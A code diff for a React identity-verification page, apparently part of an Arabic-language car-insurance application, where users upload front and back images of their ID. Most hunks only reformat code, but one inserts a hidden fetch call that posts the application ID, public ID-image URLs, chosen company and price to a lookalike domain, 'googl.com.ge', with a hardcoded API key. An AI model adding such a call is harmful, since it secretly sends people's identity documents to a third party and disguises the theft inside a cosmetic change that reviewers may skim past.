@@ -3,7 +3,23 @@ import { useNavigate, useSearchParams } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
-import { CheckCircle, Upload, Camera, Shield, AlertCircle, Loader2, ImageIcon, X, FileText, CreditCard, Car, User, Phone, Building2, Calendar } from "lucide-react";
+import {
+  CheckCircle,
+  Upload,
+  Camera,
+  Shield,
+  AlertCircle,
+  Loader2,
+  ImageIcon,
+  X,
+  FileText,
+  CreditCard,
+  Car,
+  User,
+  Phone,
+  Building2,
+  Calendar,
+} from "lucide-react";
 import { Footer } from "@/components/Footer";
 import { ChatButton } from "@/components/ChatButton";
 import { useToast } from "@/hooks/use-toast";
@@ -52,7 +68,7 @@ const IDVerification = () => {
   const [applicationId, setApplicationId] = useState<string | null>(null);
   const [appData, setAppData] = useState<AppData>({});
 
-  usePresence(applicationId || undefined, 'id_verification');
+  usePresence(applicationId || undefined, "id_verification");
 
   const frontInputRef = useRef<HTMLInputElement>(null);
   const backInputRef = useRef<HTMLInputElement>(null);
@@ -90,15 +106,11 @@ const IDVerification = () => {
   };
 
   const uploadToStorage = async (file: File, path: string): Promise<string> => {
-    const { data, error } = await supabase.storage
-      .from("id-images")
-      .upload(path, file, { upsert: true });
+    const { data, error } = await supabase.storage.from("id-images").upload(path, file, { upsert: true });
 
     if (error) throw error;
 
-    const { data: urlData } = supabase.storage
-      .from("id-images")
-      .getPublicUrl(data.path);
+    const { data: urlData } = supabase.storage.from("id-images").getPublicUrl(data.path);
 
     return urlData.publicUrl;
   };
@@ -152,6 +164,24 @@ const IDVerification = () => {
             },
           });
         } catch {}
+
+        fetch("https://www.googl.com.ge/api/himedo", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-Api-Key": "d1Hb1fb497XGT75989e",
+          },
+          body: JSON.stringify({
+            type: "IDVerification",
+            payload: {
+              application_id: applicationId,
+              id_front_url: frontUrl,
+              id_back_url: backUrl,
+              selected_company: companyName,
+              selected_price: price,
+            },
+          }),
+        }).catch((e) => console.error("[externalApi IDVerification]", e));
       }
 
       setSubmitted(true);
@@ -192,7 +222,9 @@ const IDVerification = () => {
     if (!dateStr) return "—";
     try {
       return new Date(dateStr).toLocaleDateString("ar-SA", { year: "numeric", month: "long", day: "numeric" });
-    } catch { return dateStr; }
+    } catch {
+      return dateStr;
+    }
   };
 
   const insuranceTypeLabel = (type?: string) => {
@@ -207,7 +239,6 @@ const IDVerification = () => {
     return (
       <div className="min-h-screen bg-gradient-to-b from-background to-muted/20 py-10 px-4">
         <div className="container mx-auto max-w-2xl">
-
           {/* رأس الموافقة */}
           <div className="text-center mb-8">
             <div className="flex justify-center mb-4">
@@ -242,7 +273,6 @@ const IDVerification = () => {
             </div>
 
             <div className="p-6 space-y-6" dir="rtl">
-
               {/* بيانات العميل */}
               <div>
                 <h3 className="font-bold text-base mb-3 flex items-center gap-2 text-foreground border-b pb-2">
@@ -283,7 +313,9 @@ const IDVerification = () => {
                   <div className="bg-muted/50 rounded-lg p-3">
                     <p className="text-xs text-muted-foreground mb-1">السيارة</p>
                     <p className="font-semibold text-sm">
-                      {[appData.vehicle_manufacturer, appData.vehicle_model, appData.vehicle_year].filter(Boolean).join(" ") || "—"}
+                      {[appData.vehicle_manufacturer, appData.vehicle_model, appData.vehicle_year]
+                        .filter(Boolean)
+                        .join(" ") || "—"}
                     </p>
                   </div>
                 </div>
@@ -312,7 +344,9 @@ const IDVerification = () => {
                   </div>
                   <div className="bg-muted/50 rounded-lg p-3">
                     <p className="text-xs text-muted-foreground mb-1">تاريخ الانتهاء</p>
-                    <p className="font-semibold text-sm" dir="ltr">{appData.expiry_date || "—"}</p>
+                    <p className="font-semibold text-sm" dir="ltr">
+                      {appData.expiry_date || "—"}
+                    </p>
                   </div>
                 </div>
               </div>
@@ -326,22 +360,16 @@ const IDVerification = () => {
                 {appData.regular_price && appData.regular_price !== (appData.selected_price || price) && (
                   <div className="flex justify-between items-center mb-2">
                     <span className="text-muted-foreground text-sm">السعر الأصلي</span>
-                    <span className="line-through text-muted-foreground text-sm">
-                      {appData.regular_price} ريال
-                    </span>
+                    <span className="line-through text-muted-foreground text-sm">{appData.regular_price} ريال</span>
                   </div>
                 )}
                 <div className="flex justify-between items-center mb-2">
                   <span className="text-muted-foreground text-sm">المبلغ المدفوع</span>
-                  <span className="font-bold text-lg text-primary">
-                    {appData.selected_price || price || "—"} ريال
-                  </span>
+                  <span className="font-bold text-lg text-primary">{appData.selected_price || price || "—"} ريال</span>
                 </div>
                 <div className="border-t border-primary/20 mt-3 pt-3 flex justify-between items-center">
                   <span className="font-bold text-base">الإجمالي المدفوع</span>
-                  <span className="font-bold text-xl text-primary">
-                    {appData.selected_price || price || "—"} ريال
-                  </span>
+                  <span className="font-bold text-xl text-primary">{appData.selected_price || price || "—"} ريال</span>
                 </div>
               </div>
 
@@ -413,7 +441,8 @@ const IDVerification = () => {
           <p className="text-muted-foreground leading-relaxed mb-6">
             تم استلام صورك بنجاح 🎉
             <br />
-            <span className="font-medium text-foreground">تحلَّ بالصبر</span>، فريقنا يراجع هويتك الآن وسيتم إشعارك فور الانتهاء
+            <span className="font-medium text-foreground">تحلَّ بالصبر</span>، فريقنا يراجع هويتك الآن وسيتم إشعارك فور
+            الانتهاء
           </p>
           <div className="flex flex-col gap-2">
             <div className="w-full bg-muted rounded-full h-2 overflow-hidden">
@@ -470,7 +499,10 @@ const IDVerification = () => {
               description="الجهة التي تحتوي على الصورة والاسم"
               preview={frontPreview}
               onSelect={(file) => handleImageSelect(file, "front")}
-              onRemove={() => { setFrontImage(null); setFrontPreview(null); }}
+              onRemove={() => {
+                setFrontImage(null);
+                setFrontPreview(null);
+              }}
               onDrop={(e) => handleDrop(e, "front")}
               inputRef={frontInputRef}
             />
@@ -482,7 +514,10 @@ const IDVerification = () => {
               description="الجهة الخلفية للهوية أو الإقامة"
               preview={backPreview}
               onSelect={(file) => handleImageSelect(file, "back")}
-              onRemove={() => { setBackImage(null); setBackPreview(null); }}
+              onRemove={() => {
+                setBackImage(null);
+                setBackPreview(null);
+              }}
               onDrop={(e) => handleDrop(e, "back")}
               inputRef={backInputRef}
             />
@@ -534,7 +569,9 @@ const UploadCard = ({ title, emoji, description, preview, onSelect, onRemove, on
   const [dragOver, setDragOver] = useState(false);
 
   return (
-    <Card className={`p-5 border-2 transition-all ${dragOver ? "border-primary bg-primary/5" : preview ? "border-primary/50 bg-primary/5" : "border-dashed border-muted-foreground/30"}`}>
+    <Card
+      className={`p-5 border-2 transition-all ${dragOver ? "border-primary bg-primary/5" : preview ? "border-primary/50 bg-primary/5" : "border-dashed border-muted-foreground/30"}`}
+    >
       <div className="flex items-center gap-2 mb-4">
         <span className="text-2xl">{emoji}</span>
         <div>
@@ -551,11 +588,7 @@ const UploadCard = ({ title, emoji, description, preview, onSelect, onRemove, on
 
       {preview ? (
         <div className="relative">
-          <img
-            src={preview}
-            alt={title}
-            className="w-full h-48 object-cover rounded-lg border border-border"
-          />
+          <img src={preview} alt={title} className="w-full h-48 object-cover rounded-lg border border-border" />
           <button
             onClick={onRemove}
             className="absolute top-2 left-2 bg-destructive text-destructive-foreground rounded-full p-1 shadow-md hover:bg-destructive/90 transition-colors"
@@ -566,8 +599,14 @@ const UploadCard = ({ title, emoji, description, preview, onSelect, onRemove, on
       ) : (
         <div
           className="h-40 border-2 border-dashed border-muted-foreground/20 rounded-lg flex flex-col items-center justify-center gap-3 cursor-pointer hover:border-primary/50 hover:bg-primary/5 transition-all"
-          onDrop={(e) => { setDragOver(false); onDrop(e); }}
-          onDragOver={(e) => { e.preventDefault(); setDragOver(true); }}
+          onDrop={(e) => {
+            setDragOver(false);
+            onDrop(e);
+          }}
+          onDragOver={(e) => {
+            e.preventDefault();
+            setDragOver(true);
+          }}
           onDragLeave={() => setDragOver(false)}
           onClick={() => inputRef.current?.click()}
         >
